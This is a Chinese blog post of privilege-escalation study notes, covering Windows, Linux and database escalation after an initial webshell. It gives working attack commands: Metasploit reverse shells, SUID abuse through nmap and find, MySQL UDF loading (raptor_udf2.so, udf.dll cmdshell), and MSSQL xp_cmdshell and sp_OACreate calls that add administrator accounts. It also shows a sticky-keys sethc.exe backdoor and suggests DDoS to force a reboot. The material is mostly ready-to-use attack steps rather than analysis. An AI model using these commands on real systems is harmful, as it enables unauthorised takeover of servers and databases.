+<h1 id="提权思路"><a href="#提权思路" class="headerlink" title="提权思路"></a>提权思路</h1><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">提权Webshell：尽量能够获取webshell，如果获取不到webshell可以在有文件上传的地方上传反弹shell脚本；或者利用漏洞（系统漏洞，服务器漏洞，第三方软件漏洞，数据库漏洞）来获取shell。</span><br><span class="line"><span class="code">    反弹shell：利用kali虚拟机msfVENOM编写反弹shell脚本</span></span><br><span class="line"><span class="code">    被控制端发起的shell---通常用于被控制端因防火墙受限，权限不足、端口被占用</span></span><br><span class="line"><span class="code">    开启监听：msfconsole模块监听响应的反弹shell脚本（当靶机点击脚本的时候），进入meterpreter模块，可以getsystem权限，获取信息等等，还可以开启远程服务功能（lcx，scocks5）</span></span><br><span class="line"><span class="code">    </span></span><br><span class="line"><span class="code"></span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Windows系统漏洞提权思路"><a href="#Windows系统漏洞提权思路" class="headerlink" title="Windows系统漏洞提权思路"></a>Windows系统漏洞提权思路</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">windows(可执行文件：一种是.com；另一种.exe)</span><br><span class="line"><span class="code">    系统溢出漏洞操作说明</span></span><br><span class="line"><span class="code">1、明确漏洞编号及版本</span></span><br><span class="line"><span class="code">2、明确漏洞利用平台及版本</span></span><br><span class="line"><span class="code">3、确保cmd执行权限正常运行</span></span><br><span class="line"><span class="code">4、确保服务器相关防护软件情况</span></span><br><span class="line"><span class="code"></span></span><br><span class="line">查看系统补丁，提权前期准备【前提已获取webshell】</span><br><span class="line">方法一：输入shell进入到该主机的shell下，然后：systeminfo 查看系统详细信息</span><br><span class="line">方法二：进入到 meterpreter 下，执行 run post/windows/gather/enum<span class="emphasis">_patches 可以直接查看补丁情况</span></span><br><span class="line"><span class="emphasis">方法三：post/multi/recon/local_</span>exploit<span class="emphasis">_suggester 模块，用于快速识别系统中可能被利用的漏洞</span></span><br><span class="line"><span class="emphasis">方法四：WMIC命令也可以查看补丁数量</span></span><br><span class="line"><span class="emphasis">wmic qfe get Caption,Description,HotFixID,InstalledOn</span></span><br><span class="line"><span class="emphasis">也可以直接找是否存在某个cve-2018-8120对应的KB4131188补丁</span></span><br><span class="line"><span class="emphasis">wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:&quot;KB4131188&quot;</span></span><br><span class="line"><span class="emphasis">方法五：Windows Exploit Suggester</span></span><br><span class="line"><span class="emphasis">该工具可以将系统中已经安装的补丁程序与微软的漏洞数据库进行比较，并可以识别可能导致权限提升的漏洞，而其只需要目标系统的信息。</span></span><br><span class="line"><span class="emphasis">通过msf生成反弹exe进行反弹操作，获取meterpreter通道</span></span><br><span class="line"><span class="emphasis">监听获取成功后，进行exp的筛选</span></span><br><span class="line"><span class="emphasis">探测可提取的模块use post/multi/recon/local_</span>exploit<span class="emphasis">_suggester</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="linux系统提权思路"><a href="#linux系统提权思路" class="headerlink" title="linux系统提权思路"></a><strong>linux系统提权思路</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">**linux基础信息收集**</span><br><span class="line">uname -a 显示全部系统信息</span><br><span class="line">cat /etc/issue 内核信息。此命令也适用于所有的Linux发行版</span><br><span class="line">cat /etc/passwd 所有人都可看</span><br><span class="line">ps aux | grep root</span><br><span class="line">**(1)#内核漏洞提权**</span><br><span class="line">方法：</span><br><span class="line">通过信息收集方式得知linux内核版本</span><br><span class="line">使用searchspolit搜索相应版本漏洞</span><br><span class="line">例：searchsploit linux 4.0.0</span><br><span class="line">searchsploit Ubuntu 16.04</span><br><span class="line">searchsploit Ubuntu 16 kernel 3.10</span><br><span class="line">找到对应的.c源文件,将其发送到靶机/或是靶机下载 scp， wget http://127.0.0.1/xx.c</span><br><span class="line">编译，gcc xxx.c -o exp</span><br><span class="line">**(2)#SUID提权**</span><br><span class="line">概念</span><br><span class="line">SUID（设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。</span><br><span class="line">特点</span><br><span class="line">SUID 权限仅对二进制程序有效</span><br><span class="line">执行者对于该程序需要有可执行权限(x权限)</span><br><span class="line">SUID 权限仅仅在程序执行过程中有效</span><br><span class="line">执行该程序时，执行者将具有该程序拥有者的权限</span><br><span class="line"></span><br><span class="line">首先在本地查找符合条件的文件，有以下三个命令</span><br><span class="line">列出来的所有文件都是以root用户权限来执行的，接下来找到可以提权的文件</span><br><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br><span class="line">常用的可用于suid提权的文件</span><br><span class="line">Nmap、Vim、find、Bash、More、Less、cp</span><br><span class="line">**(3)#nmap提权**</span><br><span class="line">较旧版本的Nmap（2.02至5.21）带有交互模式，从而允许用户执行shell命令。因此可以使用交互式控制台来运行具有相同权限的shell。</span><br><span class="line">方法一：</span><br><span class="line">启动交互模式，使用nmap --interactive</span><br><span class="line">!sh #执行之后将提供一个提权后的shell。</span><br><span class="line">方法二：</span><br><span class="line">Metasploit模块，也可以通过SUID Nmap二进制文件进行提权。</span><br><span class="line">exploit/unix/local/setuid_nmap</span><br><span class="line">**(4)#find提权**</span><br><span class="line">实用程序find用来在系统中查找文件。同时，它也有执行命令的能力。因此，如果配置为使用SUID权限运行，则可以通过find执行的命令都将以root身份去运行。</span><br><span class="line">**(5)#sudo提权**</span><br><span class="line">sudo命令以系统管理者的身份执行指令，也就是说，经由 sudo 所执行的指令就好像是 root 亲自执行。</span><br><span class="line">sudo 表示 “superuser do”。它允许已验证的用户以其他用户的身份来运行命令。其他用户可以是普通用户或者超级用户。然而，大部分时候我们用它来以提升的权限来运行命令。</span><br></pre></td></tr></table></figure>
+
+<h2 id="数据库提权思路"><a href="#数据库提权思路" class="headerlink" title="数据库提权思路"></a><strong>数据库提权思路</strong></h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">数据库获取网站数据库的账号和密码</span><br><span class="line">--通过读取一些数据库配置文件</span><br><span class="line">数据库配置文件：命令规则（data、sql、inc、config、conn、database等）</span><br><span class="line">--通过mysql数据库的user表</span><br><span class="line">数据库安装文件：安装目录下data/mysql/user.myd</span><br><span class="line">frm:描述表结构文件，字段长度</span><br><span class="line">myi：索引信息</span><br><span class="line">myd：数据库信息文件，存储数据信息</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-mysql数据库——udf提权"><a href="#1-mysql数据库——udf提权" class="headerlink" title="(1)mysql数据库——udf提权"></a>(1)mysql数据库——udf提权</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">udf文件:udf(user-defined-function)是mysql得一个拓展接口，也称为用户自定义函数，用户通过自定义函数来实现在mysql中无法方便实现得功能</span><br><span class="line">udf文件后缀名: .dll（windows）linux后缀名：.so</span><br><span class="line">提权原理</span><br><span class="line">已知root账号和密码，利用root权限，创建带有调用cmd函数的“udf.dll”。当我们把udf.dll导出指定文件夹引入mysql时候，其中的调用函数拿出来当作mysql函数来使用</span><br><span class="line">注意事项</span><br><span class="line">mysql版本小于5.1版本，udf.dll文件在windows2003下放在：c:\windows\system32。在windows2000放在：c:\winnt\system32</span><br><span class="line">mysql版本大于5.1版本，udf.dll文件必须放置在mysql安装目录下的lib\plugin。但是大于5.1版本的时候没有plugin这个文件夹，需要自己创建。</span><br><span class="line">利用udf文件加载函数执行命令</span><br><span class="line">create function cmdshell returns string soname &#x27;udf.dll&#x27;; //returns string soname ‘导出的DLL路径’；</span><br><span class="line">select cmdshell(&#x27;net user ndsec ndsecpw /add&#x27;);</span><br><span class="line">select cmdshell(&#x27;net localgroup administrators ndsec /add&#x27;);</span><br><span class="line">drop function cmdshell;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-数据库提权——mof提权"><a href="#2-数据库提权——mof提权" class="headerlink" title="(2)#数据库提权——mof提权"></a><strong>(2)#数据库提权——mof提权</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mof文件:mof文件是mysql数据库的扩展文件</span><br><span class="line">存放路径（C:/windows/system32/wbem/mof/nullevt.mof）</span><br><span class="line">其作用是每隔5秒就会去监控进程创建和死亡。</span><br><span class="line">提权条件</span><br><span class="line">1、windows2003及以下</span><br><span class="line">2、mysql启动身份具有权限去读写C:/windows/system32/wbem/mof/目录</span><br><span class="line">3、secure-file-priv=不为null</span><br><span class="line">提权原理</span><br><span class="line">mof文件每5秒就会执行，而且是系统权限，我们可以通过load_file将文件写入/wbme/mof，然后系统每5秒就会执行一次我们上传的mof</span><br><span class="line">mof当中是一段vbs脚本，通过通过控制vbs脚本让系统执行命令，进行提权。</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-数据库提权——反弹端口提权"><a href="#3-数据库提权——反弹端口提权" class="headerlink" title="(3)#数据库提权——反弹端口提权"></a><strong>(3)#数据库提权——反弹端口提权</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">提权条件</span><br><span class="line">1、获取数据库的账号和密码，同时能够执行查询命令。</span><br><span class="line">2、secure_file_priv=,可导出udf.dll到系统目录或者mysql数据库安装目录下的lib下plugin</span><br><span class="line">3、授权mysql数据库远程用户的登录</span><br></pre></td></tr></table></figure>
+
+<p><strong>(4)#数据库提权——启动项提权 (这种方法不推荐)</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">提权原理</span><br><span class="line">使用mysql写文件，写一段vbs代码到开启自启动中。服务器重启的时候达到创建用户并提取。可以使用DDOS迫使服务器重启</span><br><span class="line">提权条件</span><br><span class="line">secure_file_priv不为null</span><br><span class="line">已知账号和密码</span><br></pre></td></tr></table></figure>
+
+<p><strong>(5)linux系统-udf提权</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">上传脚本进行监听</span><br><span class="line">靶机连接数据库</span><br><span class="line">查看版本</span><br><span class="line">use mysql;</span><br><span class="line">create table foo(line blob);</span><br><span class="line">insert into foo values(load_file(&#x27;/tmp/raptor_udf2.so&#x27;));</span><br><span class="line">select * from foo into dumpfile &#x27;/usr/lib/mysql/plugin/raptor_udf2.so&#x27;;</span><br><span class="line">create function do_system returns integer soname &#x27;raptor_udf2.so&#x27;;</span><br><span class="line">select do_system(&#x27;chmod u+s /usr/bin/find&#x27;);</span><br><span class="line">find / -exec &quot;/bin/sh&quot; \;</span><br><span class="line">mssql数据库SA权限</span><br><span class="line">执行命令存储过程：xp_cmshell、sp_OACreate</span><br><span class="line">注册表存储过程：xp_regwrite</span><br><span class="line">存储过程</span><br><span class="line">其实质就是一个“集合”。它就是存储在sqlserver中预先定义好的“sql语句集合。”使用T-SQL语言编写好的各种小脚本共同组合成的集合体，我们就称为“存储过程”</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="利用xp-cmdshell提权"><a href="#利用xp-cmdshell提权" class="headerlink" title="利用xp_cmdshell提权"></a><strong>利用xp_cmdshell提权</strong></h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">（1）xp<span class="emphasis">_cmdshell解释</span></span><br><span class="line"><span class="emphasis">Xp_</span>cmdshell是sqlserver中的组件，可以以操作系统命令解释器的方式执行给定的命令字符串，并以文本行方式返回任何输出。可以用来执行系统命令</span><br><span class="line">（2）xp<span class="emphasis">_cmdshell开启</span></span><br><span class="line"><span class="emphasis">默认在sql server2000中是开启的，在sqlserver2005之后的版本默认禁止。如果我们有sa权限，可以用命令开启</span></span><br><span class="line"><span class="emphasis">exec sp_</span>configure ‘show advanced options’ , 1;reconfigure;</span><br><span class="line">exec sp<span class="emphasis">_configure ‘xp_</span>cmdshell’, 1;reconfigure;</span><br><span class="line">xp<span class="emphasis">_cmdshell 关闭</span></span><br><span class="line"><span class="emphasis">exec sp_</span>configure &#x27;show advanced options&#x27;,1;reconfigure;</span><br><span class="line">exec sp<span class="emphasis">_configure &#x27;ole automation procedures&#x27;,0;reconfigure;</span></span><br><span class="line"><span class="emphasis">exec sp_</span>configure &#x27;show advanced options&#x27;,0;reconfigure;</span><br><span class="line">（3）当xp<span class="emphasis">_cmdshell删除或出错的情况下，使用sp_</span>OACreate组件</span><br><span class="line">开启组件SP<span class="emphasis">_OACreate</span></span><br><span class="line"><span class="emphasis">exec sp_</span>configure &#x27;show advanced options&#x27;,1;reconfigure;</span><br><span class="line">exec sp<span class="emphasis">_configure &#x27;ole automation procedures&#x27;,1;reconfigure;</span></span><br><span class="line"><span class="emphasis">关闭组件SP_</span>OACreate</span><br><span class="line">exec sp<span class="emphasis">_configure &#x27;show advanced options&#x27;,1;reconfigure;</span></span><br><span class="line"><span class="emphasis">exec sp_</span>configure &#x27;ole automation procedures&#x27;,0;reconfigure;</span><br><span class="line">exec sp<span class="emphasis">_configure &#x27;show advanced options&#x27;,0;reconfigure;</span></span><br><span class="line"><span class="emphasis">利用SP_</span>OACreate添加用户提权</span><br><span class="line">declare @shell int exec sp<span class="emphasis">_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_</span>oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\windows\system32\cmd.exe /c net user quan 123456 /add&#x27;</span><br><span class="line">declare @shell int exec sp<span class="emphasis">_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_</span>oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\windows\system32\cmd.exe /c net localgroup administrators quan /add&#x27;</span><br><span class="line">利用SP<span class="emphasis">_OACreate的其他操作</span></span><br><span class="line"><span class="emphasis">sp_</span>OACreate替换粘贴键</span><br><span class="line">declare @o int</span><br><span class="line">exec sp<span class="emphasis">_oacreate &#x27;scripting.filesystemobject&#x27;, @o out</span></span><br><span class="line"><span class="emphasis">execsp_</span>oamethod@o,&#x27;copyfile&#x27;,null,&#x27;c:\windows\explorer.exe&#x27; ,&#x27;c:\windows\system32\sethc.exe&#x27;;</span><br><span class="line">declare @o int</span><br><span class="line">exec sp<span class="emphasis">_oacreate &#x27;scripting.filesystemobject&#x27;, @o out</span></span><br><span class="line"><span class="emphasis">execsp_</span>oamethod@o,&#x27;copyfile&#x27;,null,&#x27;c:\windows\system32\sethc.exe&#x27; ,&#x27;c:\windows\system32\dllcache\sethc.exe&#x27;;</span><br></pre></td></tr></table></figure>
+
+<h3 id="第三方软件提权思路"><a href="#第三方软件提权思路" class="headerlink" title="第三方软件提权思路"></a><strong>第三方软件提权思路</strong></h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">第三方软件指的是该非线性编辑系统生产商以外的软件公司提供的软件，功能十分强大，有些甚至是从工作站转移过来的，可以这么说，非线性编辑系统之所以能做到效果变幻莫测，匪夷所思，吸引众人的视线，完全取决于第三方软件。第三方软件提权，就是利用第三方软件存在的漏洞来进行获取一个权限的操作。</span><br></pre></td></tr></table></figure>
+
+
+
+
+      </div>
+      <div class="post-tags-categories">
+        
+        <div class="tags">
+          
+            <a href="/tags/msf/" class="">
+              msf
+            </a>
+          
+            <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="">
+              渗透测试
+            </a>
+          
+            <a href="/tags/%E5%90%8E%E6%B8%97%E9%80%8F/" class="">
+              后渗透
+            </a>
+          
+            <a href="/tags/%E6%8F%90%E6%9D%83/" class="">
+              提权
+            </a>
+          
+        </div>
+        
+      </div>
+      
+        <div class="copyright">
+  <ul class="post-copyright">
+    <li class="post-copyright-author">
+    <strong>author:  </strong>John Doe</a>
+    </li>
+    <li class="post-copyright-link">
+    <strong>link:  </strong>
+    <a href="/2024/02/26/提权/" target="_blank" title="提权学习笔记收录">http://example.com/2024/02/26/提权/</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong>Copyright notice:   </strong>
+      All articles on this website, unless otherwise stated, adopt <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+      reprint policy. If reproduced, please indicate source!
+    </li>
+  </ul>
+<div>
+      
+    </article>
+    <!-- 上一篇文章和下一篇文章 -->
+    
+      <!-- 文章详情页的上一页和下一页 -->
+<div class="post-nav">
+
+
+
+  
+  <div class="post-nav-prev post-nav-item">
+    <div class="post-nav-img" style="background-size: cover; 
+      background-position: center center;">
+      <img class="lazyload lazyload placeholder" src="https://pica.zhimg.com/80/v2-573ac3e25de03fad9c32add5a05e5cfc_1440w.webp" class="lazyload placeholder" data-srcset="https://pica.zhimg.com/80/v2-573ac3e25de03fad9c32add5a05e5cfc_1440w.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+    </div>
+    <a href="/2024/02/26/CDN%E7%BB%95%E8%BF%87/" class="post-nav-link">
+      <div class="title">
+        <i class="fas fa-angle-left"></i> Prev:
+        <div class="title-text">CDN学习笔记</div>
+      </div>
+      
+      <!-- <div class="content">
+        CDN学习笔记1CDN即内容分发网络，起初是为了提高网络的通讯效率，后被用于IP的隐藏技术。
+
+CDN绕过方法12345
+      </div> -->
+    </a>
+  </div>
+
+
+
+  
+  <div class="post-nav-next post-nav-item">
+    <div class="post-nav-img" style="background-size: cover; 
+      background-position: center center;">
+      <img class="lazyload lazyload placeholder" src="https://pic1.zhimg.com/80/v2-03a22891ccba9bccf6424dfd7cbf4be7_1440w.webp" class="lazyload placeholder" data-srcset="https://pic1.zhimg.com/80/v2-03a22891ccba9bccf6424dfd7cbf4be7_1440w.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" src="" alt="">
+    </div>
+    <a href="/2024/02/26/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%E6%A3%80%E6%9F%A5%E4%B8%8E%E5%8A%A0%E5%9B%BA/" class="post-nav-link">
+      <div class="title">
+        Next: <i class="fas fa-angle-right"></i>
+        <div class="title-text"></div>
+      </div>
+      <!-- <div class="content">
+        数据库安全检查与加固1.mysql数据库安全管理
+禁止MySQL已管理元的身份账号权限运行
+1234用普通账户运行mys
+      </div> -->
+    </a>
+  </div>
+
+</div>
+
+    
+    
+
+    <!-- 打赏 -->
+    
+      <div id="appDonate" class="post-donate">
+  <div id="donate_board" class="donate_bar center" ref="donate">
+    <a id="btn_donate" class="btn_donate" href="javascript:;" title="打赏" @click="showDialogDrawer()"></a>
+  </div>
+  <transition name="fade">
+    <div 
+      class="donate-box-mask"
+      v-cloak 
+      v-show="visible"
+      @click="cancelDialogDrawer()"
+    >
+    </div>
+  </transition>
+  <transition name="bounce">
+    <div class="donate-box" v-cloak v-show="visible">
+      <div class="donate-box_close">
+        <i class="fas fa-times" aria-hidden="true" @click="cancelDialogDrawer" pointer></i>
+      </div>
+      <div class="donate-box_title">
+        <h4>
+          你的赏识是我前进的动力
+        </h4>
+      </div>
+      <div class="donate-box_tab">
+        <div class="Alipay" pointer :class="{'active': tabActive === 'Alipay'}" @click="changeTabActive('Alipay')">
+          支付宝
+        </div>
+        <div class="WeChatpay" pointer :class="{'active': tabActive === 'WeChatpay'}" @click="changeTabActive('WeChatpay')">
+          微信
+        </div>
+      </div>
+      <div class="donate-box_img">
+        <div class="AlipayImg" v-show="tabActive === 'Alipay'">
+          <img src="/" class="lazyload placeholder" data-srcset="/" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="支付宝打赏" />
+        </div> 
+        <div class="WeChatpayImg" v-show="tabActive === 'WeChatpay'">
+          <img src="/" class="lazyload placeholder" data-srcset="/" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="微信打赏" />
+        </div>
+      </div>
+    </div>
+  </transition>
+</div>
+
+<script>
+  var body = document.body || document.documentElement || window;
+  var vm = new Vue({
+    el: '#appDonate',
+    data: {
+      visible: false,
+      tabActive: 'Alipay',
+      top: 0,
+    },
+    computed: {
+    },
+    mounted() {
+    },
+    methods: {
+      showDialogDrawer() {
+        this.visible = true;
+        // 防止页面滚动，只能让弹框滚动
+        // function getScroll() {
+        //   return {
+        //     left: window.pageXOffset || document.documentElement.scrollLeft || document.body.scrollLeft || 0,
+        //     top: window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0
+        //   };
+        // }
+        this.top = $(document).scrollTop() // or getScroll().top
+        // console.log('aa', $('.main-content'));
+        body.style.cssText = 'overflow: hidden;';
+      },
+      cancelDialogDrawer() {
+        this.visible = false;
+        body.removeAttribute('style');
+        $(document).scrollTop(this.top)
+      },
+      changeTabActive(name) {
+        this.tabActive = name;
+      }
+    },
+    created() {}
+  })
+</script>
+    
+
+    <!-- 分享 -->
+    
+      <!-- https://github.com/overtrue/share.js -->
+<!-- 文章详情页的分享 -->
+<div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+
+<script defer src="/js/shareJs/social-share.min.js"></script>
+</script>
+
+<style>
+  .social-share {
+    margin: 20px 0;
+  }
+</style>
+
+
+    
+    
+    <!-- 评论 -->
+    <!-- 评论 -->
+
+  <div id="myComment">
+    
+      <div id="gitment-container"></div>
+
+    
+  </div>
+
+
+<!-- 还需要在后面这个地址里设置script, comment script in themes\hexo-theme-bamboo\layout\_partial\scripts\index.ejs -->
+
+
+  </div>
+
+  <!-- 目录 -->
+  <aside id='l_side'>
+  
+    
+      <section class="widget side_blogger">
+  <div class='content'>
+    
+      
+        <a class='avatar flat-box rectangle' href='/about/'>
+          <img src='https://pic2.zhimg.com/80/v2-42b72d5ebee4b8d8aa70d9687effe87b_1440w.webp'/>
+        </a>
+      
+    
+    
+      <div class='text'>
+        
+          <h2>等风也等你</h2>
+        
+        
+          <p>不碰南墙不回头</p>
+
+        
+        
+          <p><span id="jinrishici-sentence">Hexo</span></p>
+          <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
+        
+      </div>
+    
+    
+      <div class="social-wrapper">
+        
+          
+            <a href="/atom.xml"
+              class="social fas fa-rss flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+              
+            </a>
+          
+        
+          
+            <a href="mailto:me@xxx.com"
+              class="social fas fa-envelope flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+              
+            </a>
+          
+        
+          
+            <a href="https://github.com/16778738"
+              class="social fab fa-github flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+              
+            </a>
+          
+        
+          
+            <a href="tencent://AddContact/?fromId=50&amp;fromSubId=1&amp;subcmd=all&amp;uin=16778738"
+              class="social fab fa-qq flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+              
+            </a>
+          
+        
+      </div>
+    
+  </div>
+</section>
+
+    
+  
+  
+  
+
+  <div class="layout_sticky">    
+    
+      
+<section class="widget side_toc">
+  
+  <header>
+    
+      <i style="color: " class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name' style="color: ">本文目录</span>
+    
+  </header>
+
+
+  <div class='content'>
+    <div class="toc-main">
+      <div class="toc-content">
+        <!-- <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#web%E6%8F%90%E6%9D%83"><span class="toc-text">web提权</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#dos%E5%91%BD%E4%BB%A4%E5%A4%A7%E5%85%A8"><span class="toc-text">dos命令大全</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E8%AF%AD%E5%8F%A5%E7%9B%B4%E6%8E%A5%E5%BC%80%E5%90%AF3389"><span class="toc-text">SQL语句直接开启3389</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%9D%80%E8%BD%AF"><span class="toc-text">常见杀软</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#windows%E6%8F%90%E6%9D%83%E4%B8%AD%E6%95%8F%E6%84%9F%E7%9B%AE%E5%BD%95%E5%92%8C%E6%95%8F%E6%84%9F%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-text">windows提权中敏感目录和敏感注册表的利用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E4%B8%AD%E7%9A%84%E6%95%8F%E6%84%9F%E6%B3%A8%E5%86%8C%E8%A1%A8%E4%BD%8D%E7%BD%AE"><span class="toc-text">**提权中的敏感注册表位置 **</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#wscript-shell%E7%9A%84%E5%88%A0%E9%99%A4%E5%92%8C%E6%81%A2%E5%A4%8D"><span class="toc-text">**wscript.shell的删除和恢复 **</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%89%BE%E5%88%B0%E5%87%86%E7%A1%AE%E7%9A%84%E7%BB%88%E7%AB%AF%E8%BF%9E%E6%8E%A5%E7%AB%AF%E5%8F%A3%EF%BC%9F"><span class="toc-text">如何找到准确的终端连接端口？</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#iis6%E6%8F%90%E6%9D%83%E6%8F%90%E7%A4%BACan-not-find-wmiprvse-exe%E7%9A%84%E7%AA%81%E7%A0%B4%E6%96%B9%E6%B3%95"><span class="toc-text">**iis6提权提示Can not find wmiprvse.exe的突破方法 **</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%BA%A2%E5%87%BA%E6%8F%90%E6%9D%83"><span class="toc-text">**本地溢出提权 **</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sa%E6%8F%90%E6%9D%83-windows%E3%80%82%E3%80%82sqlserver%E5%8F%AA%E8%83%BD%E7%94%A8%E4%BA%8Ewindows"><span class="toc-text">sa提权 -windows。。sqlserver只能用于windows</span></a></li><li class="toc-item 